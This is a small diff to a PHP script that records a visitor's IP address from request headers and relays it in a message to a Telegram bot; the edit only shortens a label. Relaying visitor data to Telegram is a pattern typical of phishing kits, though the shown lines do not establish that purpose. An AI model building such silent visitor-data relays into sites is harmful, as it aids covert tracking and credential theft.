@@ -92,7 +92,7 @@ if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
 } elseif (isset($_SERVER['HTTP_CLIENT_IP'])) {
     $ipAddress = $_SERVER['HTTP_CLIENT_IP'];
 }
-$telegramMessage .= "IP Address is: " . $ipAddress . "\n";
+$telegramMessage .= "IP Address: " . $ipAddress . "\n";
 
 // --- Send Data to Telegram ---
 $telegramSuccess = sendTelegramMessage($telegramMessage, $botToken, $chatId);
